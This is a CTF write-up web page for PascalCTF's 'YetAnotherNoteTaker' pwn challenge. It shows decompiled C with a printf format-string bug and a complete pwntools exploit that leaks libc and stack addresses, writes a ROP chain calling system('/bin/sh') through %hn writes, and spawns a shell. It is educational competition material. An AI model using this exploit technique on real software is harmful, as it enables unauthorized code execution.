@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><title>PascalCTF_01_26 &ndash; Sk4r</title>
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta charset="UTF-8"/>
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.4/css/academicons.min.css" integrity="sha512-IW0nhlW5MgNydsXJO40En2EoCkTTjZhI3yuODrZIc8cQ4h1XcF53PsqDHa09NqnkXuIe0Oiyyj171BqZFwISBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://sk4r-git.github.io/css/palettes/base16-dark.css">
+<link rel="stylesheet" href="https://sk4r-git.github.io/css/risotto.css">
+<link rel="stylesheet" href="https://sk4r-git.github.io/css/custom.css">
+
+
+
+
+
+
+
+
+
+<link rel="alternate" type="application/rss+xml" href="https://sk4r-git.github.io/ctf/pascalctf_01_26/index.xml" title="Sk4r">
+
+
+
+<meta property="og:title" content="PascalCTF_01_26 &ndash; Sk4r" />
+<meta property="og:url" content="https://sk4r-git.github.io/ctf/pascalctf_01_26/" />
+
+  
+
+<meta property="og:locale" content="fr-fr" />
+</head>
+
+<body>
+    <div class="page">
+
+        <header class="page__header"><nav class="page__nav main-nav">
+    <ul>
+      <li class="nomarker"><h1 class="page__logo"><a href="https://sk4r-git.github.io/" class="page__logo-inner">Sk4r</a></h1></li>
+    
+    </ul>
+</nav>
+
+</header>
+
+        <section class="page__body">
+    <h1 id="pascalctf_01_26">PascalCTF_01_26</h1>
+
+    <br>
+<h2 id="pwn">PWN</h2>
+<!-------------------------------------------------------------------------------------->
+<h3 id="yetanothernotetaker">YetAnotherNoteTaker</h3>
+<h4 id="attachments">attachments</h4>
+<p><a href="/ctf/pascalctf_01_26/yetanothernotetaker/notetaker">notetaker</a>
+<a href="/ctf/pascalctf_01_26/yetanothernotetaker/notetaker_patched">notetaker_patched</a>
+<a href="/ctf/pascalctf_01_26/yetanothernotetaker/libc.so.6">libc</a>
+<a href="/ctf/pascalctf_01_26/yetanothernotetaker/ld-2.23.so">ld</a>
+<a href="/ctf/pascalctf_01_26/yetanothernotetaker/solve.py">solve.py</a></p>
+<h4 id="reverse">reverse</h4>
+<p>Note taker but on stack</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>undefined8 <span style="color:#a6e22e">main</span>(EVP_PKEY_CTX <span style="color:#f92672">*</span>param_1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">size_t</span> sVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_124;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>local_120;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_118 [<span style="color:#ae81ff">264</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">init</span>(param_1);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(local_118,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">menu</span>();
+</span></span><span style="display:flex;"><span>    local_120 <span style="color:#f92672">=</span> <span style="color:#a6e22e">malloc</span>(<span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(local_120,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fgets</span>(local_120,<span style="color:#ae81ff">0x10</span>,stdin);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__isoc99_sscanf</span>(local_120,<span style="color:#f92672">&amp;</span>DAT_00400c58,<span style="color:#f92672">&amp;</span>local_124);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(local_120);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_124 <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter the note: &#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,local_118,<span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>      sVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcspn</span>(local_118,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>      local_118[sVar1] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (local_124 <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">memset</span>(local_118,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0x100</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Note cleared.&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (local_124 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(local_118);  <span style="color:#75715e">/*vuln*/</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">while</span> ((<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span> local_124) <span style="color:#f92672">&amp;&amp;</span> (local_124 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span>));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (local_10 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It&rsquo;s a format string chall, the binary is not PIE but full Relro,
+We can find pop_rdi in the code and the libc addresse through a %p leak.</p>
+<h4 id="solve">solve</h4>
+<p>Let&rsquo;s construct a ROP chain under the main stack frame</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_t</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4. Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_t</span>(d):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4. Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;note&#34;</span>, d)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clear_t</span>():
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4. Exit&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./notetaker_patched&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># io = connect(&#34;notetaker.ctf.pascalctf.it&#34;, 9002)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39; 1) Get a libc and stack leak &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>write_t(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%p-&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x40</span>)
+</span></span><span style="display:flex;"><span>read_t()
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>leak_libc <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> int(leak_libc, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f30917c4b28</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x00007f3091400000</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">38</span>):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)
+</span></span><span style="display:flex;"><span>leak_stack <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-&#34;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39; 2) Calcul needed adresses &#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>base_frame <span style="color:#f92672">=</span> int(leak_stack, <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7ffd6fedd680</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7ffd6fedd5a8</span>)
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400c03</span>
+</span></span><span style="display:flex;"><span>syst <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x7fd31fa453a0</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7fd31fa00000</span>)
+</span></span><span style="display:flex;"><span>bins <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x7fd31fb8ce57</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7fd31fa00000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decoupe</span>(n):
+</span></span><span style="display:flex;"><span>    p1 <span style="color:#f92672">=</span> n<span style="color:#f92672">%</span><span style="color:#ae81ff">0x10000</span>
+</span></span><span style="display:flex;"><span>    p2 <span style="color:#f92672">=</span> (n<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">16</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">0x10000</span>
+</span></span><span style="display:flex;"><span>    p3 <span style="color:#f92672">=</span> (n<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">0x10000</span>
+</span></span><span style="display:flex;"><span>    p4 <span style="color:#f92672">=</span> (n<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">48</span>)<span style="color:#f92672">%</span><span style="color:#ae81ff">0x10000</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [p1, p2, p3, p4]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39; 3) write pop_rdi&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>clear_t()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str(decoupe(pop_rdi)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> already_writted)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(pop_rdi)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%24$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(pop_rdi)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(pop_rdi)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%25$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(pop_rdi)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(pop_rdi)[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%26$hn&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(pop_rdi)[<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%27$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x80</span> <span style="color:#f92672">-</span> len(write_pop_rdi))
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> p64(base_frame)
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>)
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)
+</span></span><span style="display:flex;"><span>write_pop_rdi <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_t(write_pop_rdi)
+</span></span><span style="display:flex;"><span>read_t()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39; 4) write binsh&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>clear_t()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str(decoupe(bins)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> already_writted)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(bins)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%24$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(bins)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(bins)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%25$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(bins)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(bins)[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%26$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(bins)[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(bins)[<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%27$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x80</span> <span style="color:#f92672">-</span> len(write_bin_sh))
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>)
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>)
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">12</span>)
+</span></span><span style="display:flex;"><span>write_bin_sh <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">14</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_t(write_bin_sh)
+</span></span><span style="display:flex;"><span>read_t()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39; 5) write system&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>clear_t()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str(decoupe(syst)[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">-</span> already_writted)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(syst)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%24$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(syst)[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(syst)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%25$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(syst)[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(syst)[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%26$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%&#34;</span> <span style="color:#f92672">+</span> str((decoupe(syst)[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">-</span> already_writted <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>) <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;x&#34;</span>
+</span></span><span style="display:flex;"><span>already_writted <span style="color:#f92672">=</span> decoupe(syst)[<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%27$hn&#34;</span>
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">0x80</span> <span style="color:#f92672">-</span> len(write_syst))
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">18</span>)
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">20</span>)
+</span></span><span style="display:flex;"><span>write_syst <span style="color:#f92672">+=</span> p64(base_frame <span style="color:#f92672">+</span> <span style="color:#ae81ff">22</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>write_t(write_syst)
+</span></span><span style="display:flex;"><span>read_t()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39; 6) finally send 5 to properly return and trigger our ROPchain&#39;&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;5&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1. Read note
+</span></span><span style="display:flex;"><span>2. Write note
+</span></span><span style="display:flex;"><span>3. Clear note
+</span></span><span style="display:flex;"><span>4. Exit
+</span></span><span style="display:flex;"><span>&gt; $ ls
+</span></span><span style="display:flex;"><span>ld-2.23.so  libc.so.6  notetaker  notetaker_patched  solve.py
+</span></span></code></pre></div><!-------------------------------------------------------------------------------------->
+<h3 id="average_heap_challenge">average_heap_challenge</h3>
+<h4 id="attachments-1">attachments</h4>
+<p><a href="/ctf/pascalctf_01_26/average_heap_challenge/average">average</a>
+<a href="/ctf/pascalctf_01_26/average_heap_challenge/average_patched">average_patched</a>
+<a href="/ctf/pascalctf_01_26/average_heap_challenge/libc.so.6">libc</a>
+<a href="/ctf/pascalctf_01_26/average_heap_challenge/ld-linux-x86-64.so.2">ld</a>
+<a href="/ctf/pascalctf_01_26/average_heap_challenge/solve.py">solve.py</a></p>
